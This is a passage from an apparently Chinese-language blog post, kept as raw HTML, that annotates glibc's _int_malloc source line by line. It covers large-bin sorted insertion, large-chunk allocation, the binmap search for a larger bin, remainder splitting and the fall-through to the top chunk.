*/</span></span><br><span class="line">    <span class="comment">/* 从这里我们可以总结出，largebin 以 fd_nextsize 递减排序。</span></span><br><span class="line"><span class="comment">       同样大小的 chunk，后来的只会插入到之前同样大小的 chunk 后，</span></span><br><span class="line"><span class="comment">       而不会修改之前相同大小的fd/bk_nextsize，这也很容易理解，</span></span><br><span class="line"><span class="comment">       可以减低开销。此外，bin 头不参与 nextsize 链接。*/</span></span><br><span class="line">    <span class="comment">// 如果 large bin 链表不空</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        <span class="comment">// 加速比较，应该不仅仅有这个考虑，因为链表里的 chunk 都会设置该位。</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        <span class="comment">// bck-&gt;bk 存储着相应 large bin 中最小的chunk。</span></span><br><span class="line">        <span class="comment">// 如果遍历的 chunk 比当前最小的还要小，那就只需要插入到链表尾部。</span></span><br><span class="line">        <span class="comment">// 判断 bck-&gt;bk 是不是在 main arena。</span></span><br><span class="line">        assert(chunk_main_arena(bck-&gt;bk));</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt;</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask(bck-&gt;bk)) &#123;</span><br><span class="line">            <span class="comment">// 令 fwd 指向 large bin 头</span></span><br><span class="line">            fwd = bck;</span><br><span class="line">            <span class="comment">// 令 bck 指向 largin bin 尾部 chunk</span></span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line">            <span class="comment">// victim 的 fd_nextsize 指向 largin bin 的第一个 chunk</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            <span class="comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span></span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            <span class="comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span></span><br><span class="line">            <span class="comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span></span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize =</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 当前要插入的 victim 的大小大于最小的 chunk</span></span><br><span class="line">            <span class="comment">// 判断 fwd 是否在 main arena</span></span><br><span class="line">            assert(chunk_main_arena(fwd));</span><br><span class="line">            <span class="comment">// 从链表头部开始找到不比 victim 大的 chunk</span></span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask(fwd)) &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert(chunk_main_arena(fwd));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果找到了一个和 victim 一样大的 chunk，</span></span><br><span class="line">            <span class="comment">// 那就直接将 chunk 插入到该chunk的后面，并不修改 nextsize 指针。</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size ==</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask(fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果找到的chunk和当前victim大小不一样</span></span><br><span class="line">                <span class="comment">// 那么就需要构造 nextsize 双向链表了</span></span><br><span class="line">                victim-&gt;fd_nextsize              = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize                 = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 如果空的话，直接简单使得 fd_nextsize 与 bk_nextsize 构成一个双向链表即可。</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="最终取出"><a href="#最终取出" class="headerlink" title="最终取出"></a>最终取出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 放到对应的 bin 中，构成 bck&lt;--&gt;victim&lt;--&gt;fwd。</span></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk    = victim;</span><br><span class="line">bck-&gt;fd    = victim;</span><br></pre></td></tr></table></figure><h5 id="WHILE-迭代次数"><a href="#WHILE-迭代次数" class="headerlink" title="WHILE 迭代次数"></a>WHILE 迭代次数</h5><p>while 最多迭代 10000 次后退出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// #define MAX_ITERS 10000</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= MAX_ITERS) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="large-chunk"><a href="#large-chunk" class="headerlink" title="large chunk"></a>large chunk</h4><p><strong>注： 或许会很奇怪，为什么这里没有先去看 small chunk 是否满足新需求了呢？这是因为 small bin 在循环之前已经判断过了，这里如果有的话，就是合并后的才出现 chunk。但是在大循环外，large chunk 只是单纯地找到其索引，所以觉得在这里直接先判断是合理的，而且也为了下面可以再去找较大的 chunk。</strong></p><p>如果请求的 chunk 在 large chunk 范围内，就在对应的 bin 中从小到大进行扫描，找到第一个合适的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="comment">//判断是否smallbin</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">          bin = bin_at(av, idx);</span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="comment">// 如果对应的 bin 为空或者其中的chunk最大的也很小，那就跳过</span></span><br><span class="line">          <span class="comment">// first(bin)=bin-&gt;fd 表示当前链表中最大的chunk</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask(victim) &gt;=</span><br><span class="line">                  (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)) &#123;</span><br><span class="line">              <span class="comment">// 反向遍历链表，直到找到第一个不小于所需chunk大小的chunk</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize(victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                  victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="comment">// 如果最终取到的chunk不是该bin中的最后一个chunk，并且该chunk与其前面的chunk</span></span><br><span class="line">              <span class="comment">// 的大小相同，那么我们就取其前面的chunk，这样可以避免调整bk_nextsize,fd_nextsize</span></span><br><span class="line">              <span class="comment">//  链表。因为大小相同的chunk只有一个会被串在nextsize链上。</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last(bin) &amp;&amp;</span><br><span class="line">                  chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))</span><br><span class="line">                  victim = victim-&gt;fd;</span><br><span class="line">              <span class="comment">// 计算分配后剩余的大小</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              <span class="comment">// 进行unlink（宏操作）</span></span><br><span class="line">              unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="comment">// 剩下的大小不足以当做一个块</span></span><br><span class="line">              <span class="comment">// 很好奇接下来会怎么办？</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">                  set_inuse_bit_at_offset(victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="comment">//  剩下的大小还可以作为一个chunk，进行分割。</span></span><br><span class="line">              <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">// 获取剩下那部分chunk的指针，称为remainder</span></span><br><span class="line">                  remainder = chunk_at_offset(victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  <span class="comment">// 插入unsorted bin中</span></span><br><span class="line">                  bck = unsorted_chunks(av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">                  <span class="comment">// 判断 unsorted bin 是否被破坏。</span></span><br><span class="line">                  <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                  &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd       = remainder;</span><br><span class="line">                  fwd-&gt;bk       = remainder;</span><br><span class="line">                  <span class="comment">// 如果不处于small bin范围内，就设置对应的字段</span></span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="comment">// 设置分配的chunk的标记</span></span><br><span class="line">                  set_head(victim,</span><br><span class="line">                           nb | PREV_INUSE |</span><br><span class="line">                               (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">                  <span class="comment">// 设置remainder的上一个chunk，即分配出去的chunk的使用状态</span></span><br><span class="line">                  <span class="comment">// 其余的不用管，直接从上面继承下来了</span></span><br><span class="line">                  set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  <span class="comment">// 设置remainder的大小</span></span><br><span class="line">                  set_foot(remainder, remainder_size);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// 检查</span></span><br><span class="line">              check_malloced_chunk(av, victim, nb);</span><br><span class="line">              <span class="comment">// 转换为mem状态</span></span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">              <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">              alloc_perturb(p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="寻找较大-chunk"><a href="#寻找较大-chunk" class="headerlink" title="寻找较大 chunk"></a>寻找较大 chunk</h4><p><strong>如果走到了这里，那说明对于用户所需的 chunk，不能直接从其对应的合适的 bin 中获取 chunk</strong><a href="%E6%97%A0%E6%B3%95%E6%8F%90%E5%89%8D%E9%A2%84%E7%9F%A5%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%EF%BC%8C%E6%9B%B4%E5%A4%9A%E6%98%AF%E6%A0%B9%E6%8D%AE%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E9%9C%80%E8%A6%81%E8%80%8C%E5%8A%A8%E6%80%81%E5%8F%98%E5%8C%96">^1</a>，所以我们需要来查找比当前 bin 更大的 fast bin ， small bin 或者 large bin。</p><p><a href="%E6%97%A0%E6%B3%95%E6%8F%90%E5%89%8D%E9%A2%84%E7%9F%A5%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%EF%BC%8C%E6%9B%B4%E5%A4%9A%E6%98%AF%E6%A0%B9%E6%8D%AE%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E9%9C%80%E8%A6%81%E8%80%8C%E5%8A%A8%E6%80%81%E5%8F%98%E5%8C%96">^1</a>: 这里意思是去对应 bin 取，没有办法取到。比如需要一个 0x100 的chunk ，去到大小为 0x100 的bin 中取，而该 bin 中没有空闲 chunk 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">   bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">   (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">   that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">   The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">   when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">++idx;</span><br><span class="line"><span class="comment">// 获取对应的bin</span></span><br><span class="line">bin   = bin_at(av, idx);</span><br><span class="line"><span class="comment">// 获取当前索引在binmap中的block索引</span></span><br><span class="line"><span class="comment">// #define idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)  ,BINMAPSHIFT=5</span></span><br><span class="line"><span class="comment">// Binmap按block管理，每个block为一个int，共32个bit，可以表示32个bin中是否有空闲chunk存在</span></span><br><span class="line"><span class="comment">// 所以这里是右移5</span></span><br><span class="line">block = idx2block(idx);</span><br><span class="line"><span class="comment">// 获取当前块大小对应的映射，这里可以得知相应的bin中是否有空闲块</span></span><br><span class="line"><span class="built_in">map</span>   = av-&gt;binmap[ block ];</span><br><span class="line"><span class="comment">// #define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"><span class="comment">// 将idx对应的比特位设置为1，其它位为0</span></span><br><span class="line">bit   = idx2bit(idx);</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br></pre></td></tr></table></figure><h5 id="找到一个合适的-MAP"><a href="#找到一个合适的-MAP" class="headerlink" title="找到一个合适的 MAP"></a>找到一个合适的 MAP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Skip rest of block if there are no more set bits in this block.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 如果bit&gt;map，则表示该 map 中没有比当前所需要chunk大的空闲块</span></span><br><span class="line"><span class="comment">// 如果bit为0，那么说明，上面idx2bit带入的参数为0。</span></span><br><span class="line"><span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 寻找下一个block，直到其对应的map不为0。</span></span><br><span class="line">        <span class="comment">// 如果已经不存在的话，那就只能使用top chunk了</span></span><br><span class="line">        <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">            <span class="keyword">goto</span> use_top;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[ block ]) == <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 获取其对应的bin，因为该map中的chunk大小都比所需的chunk大，而且</span></span><br><span class="line">    <span class="comment">// map本身不为0，所以必然存在满足需求的chunk。</span></span><br><span class="line">    bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">    bit = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="找到合适的-BIN"><a href="#找到合适的-BIN" class="headerlink" title="找到合适的 BIN"></a>找到合适的 BIN</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="comment">// 从当前map的最小的bin一直找，直到找到合适的bin。</span></span><br><span class="line"><span class="comment">// 这里是一定存在的</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    assert(bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="简单检查-CHUNK"><a href="#简单检查-CHUNK" class="headerlink" title="简单检查 CHUNK"></a>简单检查 CHUNK</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line"><span class="comment">// 获取对应的bin</span></span><br><span class="line">victim = last(bin);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"><span class="comment">// 如果victim=bin，那么我们就将map对应的位清0，然后获取下一个bin</span></span><br><span class="line"><span class="comment">// 这种情况发生的概率应该很小。</span></span><br><span class="line"><span class="keyword">if</span> (victim == bin) &#123;</span><br><span class="line">    av-&gt;binmap[ block ] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">    bin                 = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="真正取出-CHUNK"><a href="#真正取出-CHUNK" class="headerlink" title="真正取出 CHUNK"></a>真正取出 CHUNK</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取对应victim的大小</span></span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line">    <span class="comment">// 计算分割后剩余的大小</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="comment">// 如果分割后不够一个chunk怎么办？</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="comment">// 如果够，尽管分割</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 计算剩余的chunk的偏移</span></span><br><span class="line">        remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">           have to perform a complete insert here.  */</span></span><br><span class="line">        <span class="comment">// 将剩余的chunk插入到unsorted bin中</span></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd       = remainder;</span><br><span class="line">        fwd-&gt;bk       = remainder;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">        <span class="comment">// 如果在small bin范围内，就将其标记为remainder</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range(nb)) av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置victim的使用状态</span></span><br><span class="line">        set_head(victim,</span><br><span class="line">                 nb | PREV_INUSE |</span><br><span class="line">                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// 设置remainder的使用状态，这里是为什么呢？</span></span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        <span class="comment">// 设置remainder的大小</span></span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查</span></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="comment">// chunk状态转换到mem状态</span></span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用-top-chunk"><a href="#使用-top-chunk" class="headerlink" title="使用 top chunk"></a>使用 top chunk</h3><p><strong>如果所有的 bin 中的 chunk 都没有办法直接满足要求（即不合并），或者说都没有空闲的 chunk。</strong>那么我们就只能使用 top chunk 了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">       (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">       search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">       less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">       be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">       limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">       MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">       exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">       reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">       to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    